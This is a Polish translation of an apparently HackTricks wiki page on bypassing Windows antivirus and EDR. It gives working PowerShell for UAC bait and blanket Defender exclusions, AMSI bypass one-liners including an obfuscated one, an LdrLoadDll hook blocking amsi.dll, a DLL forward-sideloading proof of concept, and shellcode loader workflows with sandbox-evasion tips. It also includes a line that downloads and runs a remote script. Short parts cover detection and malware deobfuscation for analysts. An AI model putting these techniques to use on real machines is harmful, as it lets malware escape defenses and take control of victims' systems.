# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ta strona została początkowo napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie do zatrzymania działania Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie do zatrzymania działania Windows Defender przez podszywanie się pod inny AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Public loaders podszywające się pod game cheats często są dostarczane jako niepodpisane instalatory Node.js/Nexe, które najpierw **proszą użytkownika o podniesienie uprawnień**, a dopiero potem neutralizują Defender. Flow jest prosty:

1. Sprawdź, czy istnieje kontekst administracyjny, używając `net session`. Komenda kończy się sukcesem tylko wtedy, gdy wywołujący ma prawa admina, więc failure oznacza, że loader działa jako zwykły user.
2. Natychmiast uruchom się ponownie z verbem `RunAs`, aby wywołać oczekiwany prompt UAC consent, zachowując oryginalny command line.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Ofiary już wierzą, że instalują „cracked” software, więc prompt jest zwykle akceptowany, co daje malware uprawnienia potrzebne do zmiany policy Defendera.

### Blanket `MpPreference` exclusions for every drive letter

Po podniesieniu uprawnień łańcuchy w stylu GachiLoader maksymalizują blind spots Defendera zamiast całkowicie wyłączać service. Loader najpierw zabija GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), a następnie ustawia **extremely broad exclusions**, tak aby każdy user profile, system directory i removable disk stały się unscannable:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Kluczowe obserwacje:

- Pętla przechodzi przez każdy zamontowany filesystem (D:\, E:\, USB sticks, itd.), więc **każdy przyszły payload wrzucony gdziekolwiek na disk zostanie zignorowany**.
- Wykluczenie rozszerzenia `.sys` jest przyszłościowe — attackers zachowują opcję późniejszego załadowania unsigned drivers bez ponownego dotykania Defender.
- Wszystkie zmiany trafiają do `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, co pozwala późniejszym etapom potwierdzić, że exclusions nadal obowiązują, albo rozszerzyć je bez ponownego wywoływania UAC.

Ponieważ żaden Defender service nie jest zatrzymany, proste health checks nadal raportują „antivirus active”, mimo że real-time inspection nigdy nie dotyka tych ścieżek.

## **AV Evasion Methodology**

Obecnie AV używają różnych metod sprawdzania, czy plik jest malicious, czy nie: static detection, dynamic analysis, a w bardziej zaawansowanych EDR także behavioural analysis.

### **Static detection**

Static detection polega na oznaczaniu znanych malicious strings lub tablic bajtów w binarnym pliku albo skrypcie, a także na wyciąganiu informacji z samego pliku (np. file description, company name, digital signatures, icon, checksum, itd.). Oznacza to, że używanie znanych public tools może łatwiej sprawić, że zostaniesz caught, ponieważ prawdopodobnie zostały już przeanalizowane i oznaczone jako malicious. Istnieje kilka sposobów obejścia tego typu detekcji:

- **Encryption**

Jeśli zaszyfrujesz binary, AV nie będzie miało jak wykryć twojego programu, ale będziesz potrzebować jakiegoś loadera, który odszyfruje i uruchomi program w memory.

- **Obfuscation**

Czasami wystarczy zmienić kilka strings w binary lub skrypcie, żeby przejść przez AV, ale może to być czasochłonne zadanie, zależnie od tego, co próbujesz obfuscate.

- **Custom tooling**

Jeśli tworzysz własne tools, nie będzie znanych złych signatures, ale wymaga to dużo czasu i wysiłku.

> [!TIP]
> Dobrym sposobem sprawdzania Windows Defender static detection jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Działa to tak, że dzieli plik na wiele segmentów, a następnie zleca Defenderowi skanowanie każdego z osobna; w ten sposób można dokładnie ustalić, które strings albo bytes w binary są oznaczane.

Bardzo polecam ten [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktycznym AV Evasion.

### **Dynamic analysis**

Dynamic analysis to sytuacja, w której AV uruchamia twój binary w sandbox i obserwuje malicious activity (np. próbę odszyfrowania i odczytania haseł z przeglądarki, wykonanie minidump na LSASS, itd.). Ta część może być trochę trudniejsza do obejścia, ale oto kilka rzeczy, które możesz zrobić, aby evade sandboxy.

- **Sleep before execution** W zależności od implementacji może to być świetny sposób na obejście dynamic analysis w AV. AV mają bardzo mało czasu na skanowanie plików, żeby nie przerywać workflow użytkownika, więc długie sleeps mogą zakłócić analizę binaries. Problem w tym, że wiele sandboxów AV może po prostu pominąć sleep, zależnie od implementacji.
- **Checking machine's resources** Zwykle sandboxy mają bardzo mało resources do dyspozycji (np. < 2GB RAM), bo inaczej mogłyby spowalniać maszynę użytkownika. Możesz tu też wykazać się kreatywnością, np. sprawdzając temperaturę CPU albo nawet prędkość wentylatorów — nie wszystko będzie zaimplementowane w sandbox.
- **Machine-specific checks** Jeśli chcesz zaatakować usera, którego workstation jest dołączona do domeny "contoso.local", możesz sprawdzić domenę komputera i zobaczyć, czy zgadza się z tą, którą podałeś; jeśli nie, możesz sprawić, że program zakończy działanie.

Okazuje się, że computername w Sandbox Microsoft Defender to HAL9TH, więc możesz sprawdzić nazwę komputera w swoim malware przed detonation; jeśli nazwa zgadza się z HAL9TH, oznacza to, że jesteś w sandbox Defender, więc możesz sprawić, że program zakończy działanie.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych naprawdę dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących walki z sandboxami

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Jak wspomnieliśmy wcześniej w tym poście, **public tools** ostatecznie **zostaną detected**, więc warto zadać sobie pytanie:

Na przykład, jeśli chcesz wykonać dump LSASS, **czy naprawdę musisz używać mimikatz**? A może możesz użyć innego, mniej znanego projektu, który również wykonuje dump LSASS.

Prawdopodobnie poprawna odpowiedź to ta druga. Biorąc mimikatz jako przykład, to prawdopodobnie jeden z najbardziej, jeśli nie najbardziej, flagowanych pieces of malware przez AV i EDR, a sam projekt jest super cool, ale praca z nim w celu obejścia AV to też koszmar, więc po prostu szukaj alternatyw do tego, co chcesz osiągnąć.

> [!TIP]
> Podczas modyfikowania swoich payloads pod kątem evasion upewnij się, że **wyłączysz automatic sample submission** w defender, i proszę, naprawdę, **NIE WYSYŁAJ DO VIRUSTOTAL** jeśli twoim celem jest osiągnięcie długofalowego evasion. Jeśli chcesz sprawdzić, czy twój payload jest wykrywany przez konkretny AV, zainstaluj go na VM, spróbuj wyłączyć automatic sample submission i testuj tam, aż będziesz zadowolony z rezultatu.

## EXEs vs DLLs

Gdy tylko jest to możliwe, zawsze **priorytetyzuj używanie DLLs do evasion**; z mojego doświadczenia pliki DLL są zwykle **znacznie mniej wykrywane** i analizowane, więc to bardzo prosty trik, który można zastosować, aby w niektórych przypadkach uniknąć detection (o ile twój payload ma oczywiście jakiś sposób uruchamiania jako DLL).

Jak widać na tym obrazie, DLL Payload z Havoc ma detection rate 4/26 w antiscan.me, podczas gdy EXE payload ma detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>porównanie antiscan.me zwykłego Havoc EXE payload vs zwykłego Havoc DLL</p></figcaption></figure>

Teraz pokażemy kilka trików, których możesz użyć z plikami DLL, aby były dużo bardziej stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL używaną przez loader, umieszczając obok siebie zarówno victim application, jak i malicious payload(s).

Możesz sprawdzić programy podatne na DLL Sideloading używając [Siofra](https://github.com/Cybereason/siofra) oraz następującego skryptu powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
To polecenie wyświetli listę programów podatnych na DLL hijacking w obrębie "C:\Program Files\\" oraz plików DLL, które próbują załadować.

Bardzo polecam, abyś sam **zbadał programy podatne na DLL Hijackable/Sideloadable**, ta technika jest dość stealthy, jeśli zostanie poprawnie użyta, ale jeśli skorzystasz z publicznie znanych programów DLL Sideloadable, możesz łatwo zostać wykryty.

Samo umieszczenie złośliwego DLL o nazwie, której program oczekuje do załadowania, nie uruchomi twojego payload, ponieważ program oczekuje w tym DLL określonych funkcji. Aby rozwiązać ten problem, użyjemy innej techniki zwanej **DLL Proxying/Forwarding**.

**DLL Proxying** przekierowuje wywołania, które program wykonuje z proxy (i złośliwego) DLL do oryginalnego DLL, dzięki czemu zachowuje funkcjonalność programu i jednocześnie pozwala obsłużyć wykonanie twojego payload.

Będę używał projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) od [@flangvik](https://twitter.com/Flangvik/)

Oto kroki, które wykonałem:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Ostatnie polecenie da nam 2 pliki: szablon kodu źródłowego DLL oraz oryginalny przemianowany DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany przy użyciu [SGN](https://github.com/EgeBalci/sgn)), jak i proxy DLL mają wynik wykrywalności 0/26 w [antiscan.me](https://antiscan.me)! Nazwałbym to sukcesem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Bardzo polecam** obejrzeć [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading, a także [wideo ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o tym, o czym szczegółowo rozmawialiśmy.

### Abusing Forwarded Exports (ForwardSideLoading)

Moduły PE Windows mogą eksportować funkcje, które są w rzeczywistości "forwarders": zamiast wskazywać na kod, wpis eksportu zawiera ciąg ASCII w formacie `TargetDll.TargetFunc`. Gdy wywołujący rozwiązuje export, Windows loader będzie:

- Załadować `TargetDll`, jeśli nie jest już załadowany
- Rozwiązać z niego `TargetFunc`

Kluczowe zachowania do zrozumienia:
- Jeśli `TargetDll` jest KnownDLL, jest dostarczany z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).
- Jeśli `TargetDll` nie jest KnownDLL, używana jest normalna kolejność wyszukiwania DLL, która obejmuje katalog modułu, który wykonuje rozwiązywanie forward.

To umożliwia pośredni primitive sideloadingu: znajdź podpisaną DLL, która eksportuje funkcję przekazaną do nazwy modułu niebędącego KnownDLL, a następnie umieść tę podpisaną DLL obok DLL kontrolowanej przez atakującego, nazwanej dokładnie tak jak docelowy moduł forward. Gdy forwardowany export zostanie wywołany, loader rozwiązuje forward i ładuje twoją DLL z tego samego katalogu, wykonując twoje DllMain.

Przykład zaobserwowany w Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nie jest KnownDLL, więc jest rozwiązywany przez normalną kolejność wyszukiwania.

PoC (copy-paste):
1) Skopiuj podpisaną systemową DLL do zapisywalnego folderu
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwy `NCRYPTPROV.dll` w tym samym folderze. Minimalny DllMain wystarczy, aby uzyskać wykonanie kodu; nie musisz implementować przekazywanej funkcji, aby wywołać DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Wyzwól forward za pomocą podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Zachowane zachowanie:
- rundll32 (signed) ładuje side-by-side `keyiso.dll` (signed)
- Podczas rozwiązywania `KeyIsoSetAuditingInterface`, loader podąża za forward do `NCRYPTPROV.SetAuditingInterface`
- Loader następnie ładuje `NCRYPTPROV.dll` z `C:\test` i wykonuje jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowane, otrzymasz błąd „missing API” dopiero po tym, jak `DllMain` już się uruchomiło

Wskazówki do huntingu:
- Skup się na forwarded exports, gdzie moduł docelowy nie jest KnownDLL. KnownDLLs są wymienione w `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Możesz wyliczyć forwarded exports za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz Windows 11 forwarder inventory, aby wyszukać kandydatów: https://hexacorn.com/d/apis_fwd.txt

Pomysły na detection/defense:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane DLL-e z nienależnych systemowi ścieżek, a następnie ładujące non-KnownDLLs z tą samą nazwą bazową z tego katalogu
- Wystawiaj alerty na łańcuchy procesów/modułów takie jak: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Egzekwuj zasady code integrity (WDAC/AppLocker) i blokuj write+execute w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Możesz użyć Freeze do załadowania i wykonania swojego shellcode w stealthy sposób.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion to tylko gra w kotka i myszkę, to co działa dziś, może zostać wykryte jutro, więc nigdy nie polegaj tylko na jednym toolu; jeśli to możliwe, spróbuj łączyć wiele technik evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR-y często umieszczają **user-mode inline hooks** na `ntdll.dll` syscall stubs. Aby obejść te hooki, możesz wygenerować **direct** lub **indirect** syscall stubs, które ładują poprawny **SSN** (System Service Number) i przechodzą do kernel mode bez wykonywania zahookowanego entrypoint eksportu.

**Opcje wywołania:**
- **Direct (embedded)**: wstaw instrukcję `syscall`/`sysenter`/`SVC #0` do wygenerowanego stubu (bez trafienia w export `ntdll`).
- **Indirect**: skocz do istniejącego gadget `syscall` w `ntdll`, tak aby przejście do kernel wyglądało, jakby pochodziło z `ntdll` (przydatne do evasion heurystycznego); **randomized indirect** wybiera gadget z puli dla każdego wywołania.
- **Egg-hunt**: unikaj osadzania statycznej sekwencji opcode `0F 05` na dysku; rozwiąż sekwencję syscall w czasie działania.

**Odporne na hooki strategie rozwiązywania SSN:**
- **FreshyCalls (VA sort)**: wywnioskuj SSN, sortując syscall stubs według virtual address zamiast odczytywać bajty stubów.
- **SyscallsFromDisk**: zmapuj czyste `\KnownDlls\ntdll.dll`, odczytaj SSN z jego `.text`, a potem odmapuj (omija wszystkie in-memory hooks).
- **RecycledGate**: połącz inferencję SSN opartą na sortowaniu VA z walidacją opcode, gdy stub jest czysty; w razie hooka wróć do inferencji VA.
- **HW Breakpoint**: ustaw DR0 na instrukcji `syscall` i użyj VEH, aby przechwycić SSN z `EAX` w runtime, bez parsowania zahookowanych bajtów.

Przykładowe użycie SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI został stworzony, aby zapobiegać "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Początkowo AV były w stanie skanować tylko **pliki na dysku**, więc jeśli w jakiś sposób mogłeś uruchamiać payloads **bezpośrednio w pamięci**, AV nie mogło nic zrobić, aby temu zapobiec, ponieważ nie miało wystarczającej widoczności.

Funkcja AMSI jest zintegrowana z tymi komponentami Windows.

- User Account Control, czyli UAC (elevation EXE, COM, MSI lub instalacji ActiveX)
- PowerShell (skrypty, użycie interaktywne i dynamiczna ewaluacja code)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA macros

Pozwala rozwiązaniom antywirusowym analizować zachowanie skryptów poprzez ujawnianie ich zawartości w formie, która jest zarówno niezaszyfrowana, jak i nieobfuscated.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje następujący alert w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, jak dodaje prefiks `amsi:`, a następnie ścieżkę do executable, z którego uruchomiono skrypt; w tym przypadku powershell.exe

Nie zapisaliśmy żadnego pliku na dysku, ale mimo to zostaliśmy wykryci w pamięci przez AMSI.

Ponadto, począwszy od **.NET 4.8**, code C# jest również uruchamiany przez AMSI. Dotyczy to nawet `Assembly.Load(byte[])` do ładowania execution w pamięci. Dlatego używanie niższych wersji .NET (np. 4.7.2 lub niżej) jest zalecane do execution w pamięci, jeśli chcesz ominąć AMSI.

Istnieje kilka sposobów na obejście AMSI:

- **Obfuscation**

Ponieważ AMSI działa głównie na podstawie statycznych detections, modyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na evasion.

Jednak AMSI potrafi unobfuscate skrypty nawet jeśli mają wiele warstw, więc obfuscation może być złą opcją zależnie od tego, jak zostanie wykonana. To sprawia, że evasion nie jest całkiem proste. Czasami jednak wystarczy zmienić kilka nazw zmiennych i wszystko będzie działać, więc zależy to od tego, jak bardzo coś zostało flagged.

- **AMSI Bypass**

Ponieważ AMSI jest zaimplementowane przez załadowanie DLL do procesu powershell (także cscript.exe, wscript.exe itd.), możliwe jest łatwe manipulowanie nim nawet przy uruchomieniu jako nieuprzywilejowany user. Z powodu tej flaw w implementacji AMSI, badacze znaleźli wiele sposobów na ominięcie AMSI scanning.

**Forcing an Error**

Wymuszenie, aby inicjalizacja AMSI zakończyła się błędem (amsiInitFailed), spowoduje, że żadne scan nie zostanie uruchomione dla bieżącego procesu. Pierwotnie zostało to ujawnione przez [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował signature, aby zapobiec szerszemu użyciu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Wystarczył jeden wiersz kodu powershell, aby uczynić AMSI bezużytecznym dla bieżącego procesu powershell. Ten wiersz został oczywiście sam oznaczony przez AMSI, więc potrzebna jest pewna modyfikacja, aby użyć tej techniki.

Oto zmodyfikowany AMSI bypass, który wziąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Pamiętaj, że to prawdopodobnie zostanie oznaczone, gdy ten wpis się pojawi, więc nie powinieneś publikować żadnego kodu, jeśli Twoim planem jest pozostanie niewykrytym.

**Memory Patching**

Ta technika została początkowo odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji "AmsiScanBuffer" w amsi.dll (odpowiedzialnej za skanowanie danych wejściowych dostarczanych przez użytkownika) oraz nadpisaniu jej instrukcjami zwracającymi kod E_INVALIDARG, dzięki czemu wynik rzeczywistego skanowania będzie zwracał 0, co jest interpretowane jako czysty wynik.

> [!TIP]
> Proszę przeczytać [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) dla bardziej szczegółowego wyjaśnienia.

Istnieje także wiele innych technik używanych do obejścia AMSI za pomocą powershell, sprawdź [**tę stronę**](basic-powershell-for-pentesters/index.html#amsi-bypass) oraz [**to repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), aby dowiedzieć się o nich więcej.

### Blokowanie AMSI przez zapobieganie załadowaniu amsi.dll (hook LdrLoadDll)

AMSI jest inicjalizowane dopiero po załadowaniu `amsi.dll` do bieżącego procesu. Solidnym, niezależnym od języka obejściem jest umieszczenie hooka w trybie user-mode na `ntdll!LdrLoadDll`, który zwraca błąd, gdy żądany moduł to `amsi.dll`. W rezultacie AMSI nigdy się nie ładuje i dla tego procesu nie zachodzą żadne skany.

Zarys implementacji (pseudokod x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Działa zarówno w PowerShell, WScript/CScript, jak i custom loaders (wszystko, co inaczej załadowałoby AMSI).
- Połącz to z podawaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć długich artefaktów w command line.
- Widziane używane przez loadery uruchamiane przez LOLBins (np. `regsvr32` wywołujące `DllRegisterServer`).

Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** również generuje script do obejścia AMSI.
Tool **[https://amsibypass.com/](https://amsibypass.com/)** również generuje script do obejścia AMSI, który unika signature dzięki randomizowanemu user-defined function, variables, characters expression oraz stosuje losowe wielkości liter w PowerShell keywords, aby uniknąć signature.

**Usuń wykrytą signature**

Możesz użyć toola takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą signature AMSI z memory bieżącego procesu. To narzędzie działa, skanując memory bieżącego procesu w poszukiwaniu signature AMSI, a następnie nadpisując ją instrukcjami NOP, skutecznie usuwając ją z memory.

**Produkty AV/EDR, które uses AMSI**

Listę produktów AV/EDR, które uses AMSI, znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj Powershell version 2**
Jeśli używasz PowerShell version 2, AMSI nie zostanie załadowany, więc możesz uruchamiać swoje skrypty bez skanowania przez AMSI. Możesz zrobić to:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging to funkcja, która pozwala rejestrować wszystkie polecenia PowerShell wykonane w systemie. Może to być przydatne do audytu i rozwiązywania problemów, ale może też stanowić **problem dla atakujących, którzy chcą uniknąć wykrycia**.

Aby obejść PowerShell logging, możesz użyć następujących technik:

- **Disable PowerShell Transcription and Module Logging**: Możesz użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) w tym celu.
- **Use Powershell version 2**: Jeśli użyjesz PowerShell version 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić tak: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Użyj [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), aby uruchomić powershell bez obrony (to właśnie wykorzystuje `powerpick` z Cobal Strike).


## Obfuscation

> [!TIP]
> Kilka technik obfuscation opiera się na szyfrowaniu danych, co zwiększy entropy binarki, przez co AVs i EDRs będą mogły łatwiej ją wykryć. Uważaj na to i być może stosuj szyfrowanie tylko do konkretnych sekcji kodu, które są wrażliwe lub trzeba je ukryć.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Podczas analizy malware używającego ConfuserEx 2 (lub komercyjnych forków) często spotyka się kilka warstw ochrony, które blokują dekompilatory i sandboksy. Poniższy workflow niezawodnie **przywraca niemal oryginalny IL**, który następnie można zdekompilować do C# w narzędziach takich jak dnSpy lub ILSpy.

1.  Usunięcie Anti-tampering – ConfuserEx szyfruje każdą *method body* i odszyfrowuje ją wewnątrz statycznego konstruktora *module* (`<Module>.cctor`). To również patchuje PE checksum, więc każda modyfikacja spowoduje crash binarki. Użyj **AntiTamperKiller**, aby zlokalizować zaszyfrowane tabele metadata, odzyskać klucze XOR i przepisać czysty assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output zawiera 6 parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne przy budowaniu własnego unpacker.

2.  Odzyskiwanie symboli / control-flow – przekaż *clean* plik do **de4dot-cex** (fork de4dot świadomy ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – wybiera profil ConfuserEx 2
• de4dot cofnie flattening control-flow, przywróci oryginalne namespace, klasy i nazwy zmiennych oraz odszyfruje stałe stringi.

3.  Usuwanie proxy-call – ConfuserEx zastępuje bezpośrednie wywołania method lekkimi wrapperami (czyli *proxy calls*), aby dodatkowo utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Po tym kroku powinieneś zobaczyć normalne .NET API, takie jak `Convert.FromBase64String` lub `AES.Create()`, zamiast nieczytelnych funkcji wrapper (`Class8.smethod_10`, …).

4.  Ręczne czyszczenie – uruchom wynikową binarkę w dnSpy, wyszukaj duże bloby Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby zlokalizować *real* payload. Często malware przechowuje go jako tablicę bajtów kodowaną TLV, inicjalizowaną wewnątrz `<Module>.byte_0`.

Powyższy łańcuch przywraca execution flow **bez** potrzeby uruchamiania złośliwej próbki – przydatne podczas pracy na offline workstation.

> 🛈  ConfuserEx generuje niestandardowy atrybut o nazwie `ConfusedByAttribute`, który może służyć jako IOC do automatycznego triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest dostarczenie otwartoźródłowego forka pakietu kompilacyjnego [LLVM](http://www.llvm.org/), który umożliwia zwiększenie bezpieczeństwa oprogramowania poprzez [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) oraz tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak używać języka `C++11/14` do generowania, w czasie kompilacji, obfuscated code bez używania żadnych zewnętrznych narzędzi i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuscated operations generowanych przez framework template metaprogramming w C++, co trochę utrudni życie osobie próbującej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to x64 binary obfuscator, który potrafi obfuscate różne pliki pe, w tym: .exe, .dll, .sys
